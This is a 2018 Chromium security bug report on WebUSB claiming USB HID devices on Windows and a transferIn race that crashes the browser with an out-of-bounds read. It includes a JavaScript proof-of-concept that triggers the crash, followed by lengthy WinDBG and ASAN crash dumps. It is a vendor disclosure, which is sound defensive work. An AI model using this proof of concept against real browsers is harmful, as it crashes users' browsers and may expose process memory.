# Security: WebUSB HID Device Access + OOB Read / Crash Via WebUSB transferIn

| Field | Value |
|-------|-------|
| **Issue ID** | [40090676](https://issues.chromium.org/issues/40090676) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>USB |
| **Platforms** | Windows |
| **Reporter** | ve...@gmail.com |
| **Assignee** | re...@chromium.org |
| **Created** | 2018-03-03 |
| **Bounty** | $5,000.00 |

## Description

**VULNERABILITY DETAILS**  

On Windows 10, USB HID devices can be claimed via the WebUSB API.  

When doing a transferIn call on the claimed USB devices, the main browser process will crash after a non-deterministic time has passed (between some seconds up to some minutes). The crash is sometimes  

an OOB heap read, sometimes a read from an invalid pointer (see below).  

ASAN will also report an overlapping memcpy call and also sometimes  

an OOB heap read.  

This seems to depend on the device (I tested the Feitian ePass and the Yubikey Neo). For crash analysis in WinDBG (64.0.3282.186 (Official Build) (64-bit)) and the ASAN crash report (asan-win32-release\_x64-539034) see below. I suspect a race condition that leads to memory corruption.

Two security issues are relevant here:

1. HID devices should not be allowed to be claimed via WebUSB;
2. OOB memory access.

**VERSION**  

Chrome Version: 64.0.3282.186 (Official Build) (64-bit) stable, asan-win32-release\_x64-539034  

Operating System: Windows 10 Enterprise Build 16299.rs3\_release.170928-1534, running on VMWare Workstation 14

**REPRODUCTION CASE**  

Connect a HID device (e.g. Yubikey NEO or Feitian ePass)  

The following JavaScript should reproduce the issue:

```
  
async function crashWebUSB() {  
  
	// filters here: http://www.linux-usb.org/usb.ids  
	try {  
		device = await navigator.usb.requestDevice({ filters: [  ] })  
			.then(selectedDevice  => {  
				device = selectedDevice;  
				// registerDevice(device);  
				console.log(device.configuration.interfaces);  
				return device;  
			});  
  
		await device.open();  
		await device.selectConfiguration(1); // Select configuration #1 for the device.  
		await device.claimInterface(0); // Request exclusive control over interface #2.  
		await device.selectAlternateInterface(0, 0);  
  
		// ++ anti tests  
		// await device.open()  
		// return device.open()  
		// .then(() => {  
		//     if (device.configuration === null){  
		//         return device.selectConfiguration(1)  
		//     }  
		// })  
		// .then(() => device.claimInterface(2))  
  
		console.log("Claimed USB Device")  
		console.log("Trying to receive some data");  
		// nondeterministic time until crash here, firing up multiple transfers seems make it faster		  
		tr =  device.transferIn(4, 4096).then(result => {  
			console.log('<', (result.data.buffer)); })  
	} catch (e) {  
		console.log(e);  
	}  
  
  
}  
  
crashWebUSB();  

```

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: browser  

Crash State:

## Crash Chrome Version 64.0.3282.186 (Official Build) (64-bit), Yubikey NEO - U2F HID

WinDBG crash analysis:

0:042> !analyze -v  

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  

\* \*  

\* Exception Analysis \*  

\* \*  

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

\*\*\* ERROR: Symbol file could not be found. Defaulted to export symbols for C:\Program Files (x86)\Google\Chrome\Application\chrome.exe -  

GetUrlPageData2 (WinHttp) failed: 12007.

DUMP\_CLASS: 2

DUMP\_QUALIFIER: 0

FAULTING\_IP:  

chrome!IsSandboxedProcess+ed77a7  

00007ffa`2fd7acf3 0f10440af0 movups xmm0,xmmword ptr [rdx+rcx-10h]

EXCEPTION\_RECORD: (.exr -1)  

ExceptionAddress: 00007ffa2fd7acf3 (chrome!IsSandboxedProcess+0x0000000000ed77a7)  

ExceptionCode: c0000005 (Access violation)  

ExceptionFlags: 00000000  

NumberParameters: 2  

Parameter[0]: 0000000000000000  

Parameter[1]: 0000020cc862c110  

Attempt to read from address 0000020cc862c110

FAULTING\_THREAD: 00000b30

DEFAULT\_BUCKET\_ID: INVALID\_POINTER\_READ

PROCESS\_NAME: chrome.exe

ERROR\_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p referenced memory at 0x%p. The memory could not be %s.

EXCEPTION\_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p referenced memory at 0x%p. The memory could not be %s.

EXCEPTION\_CODE\_STR: c0000005

EXCEPTION\_PARAMETER1: 0000000000000000

EXCEPTION\_PARAMETER2: 0000020cc862c110

FOLLOWUP\_IP:  

chrome!IsSandboxedProcess+ed77a7  

00007ffa`2fd7acf3 0f10440af0 movups xmm0,xmmword ptr [rdx+rcx-10h]

READ\_ADDRESS: 0000020cc862c110

WATSON\_BKT\_PROCSTAMP: 5a8e38d5

WATSON\_BKT\_PROCVER: 64.0.3282.186

PROCESS\_VER\_PRODUCT: Google Chrome

WATSON\_BKT\_MODULE: chrome.dll

WATSON\_BKT\_MODSTAMP: 5a8e35df

WATSON\_BKT\_MODOFFSET: 263acf3

WATSON\_BKT\_MODVER: 64.0.3282.186

MODULE\_VER\_PRODUCT: Google Chrome

BUILD\_VERSION\_STRING: 10.0.16299.15 (WinBuild.160101.0800)

MODLIST\_WITH\_TSCHKSUM\_HASH: f71a334cb4fbebc2e1831de551a3037a2838107f

MODLIST\_SHA1\_HASH: a7c491ae9c70655f707556b5efeb07e54f6a7368

NTGLOBALFLAG: 0

APPLICATION\_VERIFIER\_FLAGS: 0

PRODUCT\_TYPE: 1

SUITE\_MASK: 272

DUMP\_TYPE: fe

ANALYSIS\_SESSION\_HOST: MSEDGEWIN10

ANALYSIS\_SESSION\_TIME: 03-04-2018 00:07:55.0702

ANALYSIS\_VERSION: 10.0.16299.91 amd64fre

THREAD\_ATTRIBUTES:  

OS\_LOCALE: ENU

PROBLEM\_CLASSES:

```
ID:     [0n301]  
Type:   [@ACCESS_VIOLATION]  
Class:  Addendum  
Scope:  BUCKET_ID  
Name:   Omit  
Data:   Omit  
PID:    [Unspecified]  
TID:    [0xb30]  
Frame:  [0] : chrome!IsSandboxedProcess  

ID:     [0n273]  
Type:   [INVALID_POINTER_READ]  
Class:  Primary  
Scope:  DEFAULT_BUCKET_ID (Failure Bucket ID prefix)  
        BUCKET_ID  
Name:   Add  
Data:   Omit  
PID:    [Unspecified]  
TID:    [0xb30]  
Frame:  [0] : chrome!IsSandboxedProcess  

```

BUGCHECK\_STR: APPLICATION\_FAULT\_INVALID\_POINTER\_READ

PRIMARY\_PROBLEM\_CLASS: APPLICATION\_FAULT

LAST\_CONTROL\_TRANSFER: from 00007ffa2eece0ed to 00007ffa2fd7acf3

STACK\_TEXT:  

000000ab`bffff2d8 00007ffa`2eece0ed : 00000000`00000002 00007ffa`2eecf032 0000020b`cde36990 00007ffa`2eed2c29 : chrome!IsSandboxedProcess+0xed77a7  

000000ab`bffff2e0 00007ffa`2eec9a9a : 00000000`00000001 00000000`00000000 00000000`00000002 0000020b`cac1a6e0 : chrome!IsSandboxedProcess+0x2aba1  

000000ab`bffff330 00007ffa`2eed27d2 : 00008885`ff6b1e9f 0000020b`cd92b8e0 00000000`00000000 00000000`00000000 : chrome!IsSandboxedProcess+0x2654e  

000000ab`bffff3f0 00007ffa`2eed2319 : 00007ffa`2ff36d58 00007ffa`2d7412cb 00000000`00000030 00000000`00000030 : chrome!IsSandboxedProcess+0x2f286  

000000ab`bffff480 00007ffa`2eed289a : 00000009`00000009 000000ab`00000000 00000000`00000017 00007ffa`2d744455 : chrome!IsSandboxedProcess+0x2edcd  

000000ab`bffff4e0 00007ffa`2eebaf77 : 00007d51`bb2c1ba4 000000ab`bffff678 0000020b`cda9ab50 00000000`00000014 : chrome!IsSandboxedProcess+0x2f34e  

000000ab`bffff520 00007ffa`2d858e4f : 0000020b`c591aae0 00007ffa`2d75ed62 00000000`00000000 00000000`00000000 : chrome!IsSandboxedProcess+0x17a2b  

000000ab`bffff6c0 00007ffa`2e62eb72 : ffffffff`ffffffff 00000000`00000000 00000000`00000000 00000000`00000000 : chrome!ovly\_debug\_event+0x11318f  

000000ab`bffff760 00007ffa`5de41fe4 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : chrome!GetHandleVerifier+0xef72  

000000ab`bffff7e0 00007ffa`5dfdefc1 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : KERNEL32!BaseThreadInitThunk+0x14  

000000ab`bffff810 00000000`00000000 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : ntdll!RtlUserThreadStart+0x21

THREAD\_SHA1\_HASH\_MOD\_FUNC: ac17f1c3a51bcb6e69517176fe5eab5afb02b499

THREAD\_SHA1\_HASH\_MOD\_FUNC\_OFFSET: bf5d793aea34814ebda2cf224ecf228aecb092f1

THREAD\_SHA1\_HASH\_MOD: 6e67fa0694e34f8e0536d9de2f93a743a0d71588

FAULT\_INSTR\_CODE: a44100f

SYMBOL\_STACK\_INDEX: 0

SYMBOL\_NAME: chrome!IsSandboxedProcess+ed77a7

FOLLOWUP\_NAME: MachineOwner

MODULE\_NAME: chrome

IMAGE\_NAME: chrome.dll

DEBUG\_FLR\_IMAGE\_TIMESTAMP: 5a8e35df

STACK\_COMMAND: ~42s ; .cxr ; kb

FAILURE\_BUCKET\_ID: INVALID\_POINTER\_READ\_c0000005\_chrome.dll!IsSandboxedProcess

BUCKET\_ID: APPLICATION\_FAULT\_INVALID\_POINTER\_READ\_chrome!IsSandboxedProcess+ed77a7

FAILURE\_EXCEPTION\_CODE: c0000005

FAILURE\_IMAGE\_NAME: chrome.dll

BUCKET\_ID\_IMAGE\_STR: chrome.dll

FAILURE\_MODULE\_NAME: chrome

BUCKET\_ID\_MODULE\_STR: chrome

FAILURE\_FUNCTION\_NAME: IsSandboxedProcess

BUCKET\_ID\_FUNCTION\_STR: IsSandboxedProcess

BUCKET\_ID\_OFFSET: ed77a7

BUCKET\_ID\_MODTIMEDATESTAMP: 5a8e35df

BUCKET\_ID\_MODCHECKSUM: 306b120

BUCKET\_ID\_MODVER\_STR: 64.0.3282.186

BUCKET\_ID\_PREFIX\_STR: APPLICATION\_FAULT\_INVALID\_POINTER\_READ\_

FAILURE\_PROBLEM\_CLASS: APPLICATION\_FAULT

FAILURE\_SYMBOL\_NAME: chrome.dll!IsSandboxedProcess

WATSON\_STAGEONE\_URL: <http://watson.microsoft.com/StageOne/chrome.exe/64.0.3282.186/5a8e38d5/chrome.dll/64.0.3282.186/5a8e35df/c0000005/0263acf3.htm?Retriage=1>

TARGET\_TIME: 2018-03-03T23:08:07.000Z

OSBUILD: 16299

OSSERVICEPACK: 15

SERVICEPACK\_NUMBER: 0

OS\_REVISION: 0

OSPLATFORM\_TYPE: x64

OSNAME: Windows 10

OSEDITION: Windows 10 WinNt SingleUserTS

USER\_LCID: 0

OSBUILD\_TIMESTAMP: 1976-06-22 08:45:20

BUILDDATESTAMP\_STR: 160101.0800

BUILDLAB\_STR: WinBuild

BUILDOSVER\_STR: 10.0.16299.15

ANALYSIS\_SESSION\_ELAPSED\_TIME: 2cd4

ANALYSIS\_SOURCE: UM

FAILURE\_ID\_HASH\_STRING: um:invalid\_pointer\_read\_c0000005\_chrome.dll!issandboxedprocess

FAILURE\_ID\_HASH: {1873033c-ed88-222a-75c6-a5c73a64a892}

## Followup: MachineOwner

## Chrome asan-win32-release\_x64-539034 - Crash-Yubikey-U2F:

Running the test in ASAN gives a "memcpy-param-overlap" error when  

run with the YubiKey U2F or YubiKey NEO. For Feitian devices  

it will give a heap OOB read. Here is the crash information  

for the YubiKey NEO:

# Unable to read VR Path Registry from C:\Users\IEUser\AppData\Local\openvr\openvrpaths.vrpath

==4836==ERROR: AddressSanitizer: memcpy-param-overlap: memory ranges [0x120baea5d120,0x120caea5d11f) and [0x120badf89d01, 0x120cadf89d00) overlap  

#0 0x7ff7f835afd8 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.exe+0x14003afd8)  

#1 0x7ffdde925fcb (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x1861c5fcb)  

#2 0x7ffdde91998d (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x1861b998d)  

#3 0x7ffdde934531 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x1861d4531)  

#4 0x7ffdde9332c0 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x1861d32c0)  

#5 0x7ffdde934967 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x1861d4967)  

#6 0x7ffdde8cb20a (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x18616b20a)  

#7 0x7ffddc043798 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x1838e3798)  

#8 0x7ffddbf61f3f (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x183801f3f)  

#9 0x7ff7f8351d78 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.exe+0x140031d78)  

#10 0x7ffe1b5b1fe3 (C:\Windows\System32\KERNEL32.DLL+0x180011fe3)  

#11 0x7ffe1d9befc0 (C:\Windows\SYSTEM32\ntdll.dll+0x18006efc0)

0x120baea5e127 is located 0 bytes to the right of 4135-byte region [0x120baea5d100,0x120baea5e127)  

allocated by thread T0 here:  

#0 0x7ff7f835a3a1 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.exe+0x14003a3a1)  

#1 0x7ffde3039462 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x18a8d9462)  

#2 0x7ffddc0801ef (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x1839201ef)  

#3 0x7ffddba7e83e (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x18331e83e)  

#4 0x7ffdd9782b9e (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x181022b9e)  

#5 0x7ffddba82222 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x183322222)  

#6 0x7ffddd0577aa (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x1848f77aa)  

#7 0x7ffddd042c2a (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x1848e2c2a)  

#8 0x7ffddd041ba0 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x1848e1ba0)  

#9 0x7ffddd0533b0 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x1848f33b0)  

#10 0x7ffddd054738 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x1848f4738)  

#11 0x7ffddcf95e05 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x184835e05)  

#12 0x7ffddc1bf851 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x183a5f851)  

#13 0x7ffddc00255d (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x1838a255d)  

#14 0x7ffddc003967 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x1838a3967)  

#15 0x7ffddc171620 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x183a11620)  

#16 0x7ffddc1702f0 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x183a102f0)  

#17 0x7ffddbfa6cd7 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x183846cd7)  

#18 0x7ffddbd8f4e3 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x18362f4e3)  

#19 0x7ffdd9e9b7a8 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x18173b7a8)  

#20 0x7ffdd9ea53ab (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x1817453ab)  

#21 0x7ffdd9e8fbc9 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x18172fbc9)  

#22 0x7ffddbac48b1 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x1833648b1)  

#23 0x7ffddbac5a62 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x183365a62)  

#24 0x7ffddbb3338b (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x1833d338b)  

#25 0x7ffddbac4506 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x183364506)  

#26 0x7ffdd87613ea (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x1800013ea)  

#27 0x7ff7f8327e5c (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.exe+0x140007e5c)  

#28 0x7ff7f832234c (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.exe+0x14000234c)  

#29 0x7ff7f8660c18 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.exe+0x140340c18)

Thread T56 created by T46 here:  

#0 0x7ff7f8350cb3 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.exe+0x140030cb3)  

#1 0x7ffddbf6149b (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x18380149b)  

#2 0x7ffddc043112 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x1838e3112)  

#3 0x7ffdde8cb5fa (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x18616b5fa)  

#4 0x7ffdde89ebc6 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x18613ebc6)  

#5 0x7ffdde8afe5c (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x18614fe5c)  

#6 0x7ffddc1bf851 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x183a5f851)  

#7 0x7ffddc1c51ff (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x183a651ff)  

#8 0x7ffddc1c3acc (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x183a63acc)  

#9 0x7ffddc1df440 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x183a7f440)  

#10 0x7ffddbf61f3f (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x183801f3f)  

#11 0x7ff7f8351d78 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.exe+0x140031d78)  

#12 0x7ffe1b5b1fe3 (C:\Windows\System32\KERNEL32.DLL+0x180011fe3)  

#13 0x7ffe1d9befc0 (C:\Windows\SYSTEM32\ntdll.dll+0x18006efc0)

Thread T46 created by T0 here:  

#0 0x7ff7f8350cb3 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.exe+0x140030cb3)  

#1 0x7ffddbf6149b (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x18380149b)  

#2 0x7ffddc1de320 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x183a7e320)  

#3 0x7ffddc1ddf64 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x183a7df64)  

#4 0x7ffddc1d355d (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x183a7355d)  

#5 0x7ffddc1d6eff (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x183a76eff)  

#6 0x7ffddc1d3b76 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x183a73b76)  

#7 0x7ffddc1dadf4 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x183a7adf4)  

#8 0x7ffddc1da976 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x183a7a976)  

#9 0x7ffddc1db79a (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x183a7b79a)  

#10 0x7ffddc1dbc8d (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x183a7bc8d)  

#11 0x7ffddc00765c (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x1838a765c)  

#12 0x7ffddb465f2e (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x182d05f2e)  

#13 0x7ffddb4672ce (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x182d072ce)  

#14 0x7ffde10cc61e (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x18896c61e)  

#15 0x7ffddb495ea0 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x182d35ea0)  

#16 0x7ffde289a102 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x18a13a102)  

#17 0x7ffde2884826 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x18a124826)  

#18 0x7ffde287f3de (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x18a11f3de)  

#19 0x7ffde07463fa (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x187fe63fa)  

#20 0x7ffde074d72c (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x187fed72c)  

#21 0x7ffddbcb26c7 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x1835526c7)  

#22 0x7ffddbcb32fd (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x1835532fd)  

#23 0x7ffddbb5ef6b (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x1833fef6b)  

#24 0x7ffddbb5eabf (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x1833feabf)  

#25 0x7ffddbb9c4d5 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x18343c4d5)  

#26 0x7ffddd990a56 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x185230a56)  

#27 0x7ffddd97db0f (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x18521db0f)  

#28 0x7ffddd97d0aa (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x18521d0aa)  

#29 0x7ffddd97cbcb (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x18521cbcb)  

#30 0x7ffddd97c7d0 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x18521c7d0)  

#31 0x7ffddbb87685 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x183427685)  

#32 0x7ffddbb4a217 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x1833ea217)  

#33 0x7ffddd97db0f (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x18521db0f)  

#34 0x7ffddd97d0aa (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x18521d0aa)  

#35 0x7ffddd97cbcb (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x18521cbcb)  

#36 0x7ffddd97c7d0 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x18521c7d0)  

#37 0x7ffddd990173 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x185230173)  

#38 0x7ffddd98f7a1 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x18522f7a1)  

#39 0x7ffddd98ea3a (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x18522ea3a)  

#40 0x7ffddbbae46a (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x18344e46a)  

#41 0x7ffddbbff102 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x18349f102)  

#42 0x7ffddbbf8090 (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x183498090)  

#43 0x7ffddbbf7a5f (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x183497a5f)  

#44 0x7ffddcc06b9a (C:\Users\IEUser\Downloads\win32-release\_x64\_asan-win32-release\_x64-539034\asan-win32-release\_x64-539034\chrome.dll+0x1844a6b9a)  

#45 0x7ffe1bc8b85c (C:\Windows\System32\USER32.dll+0x18000b85c)  

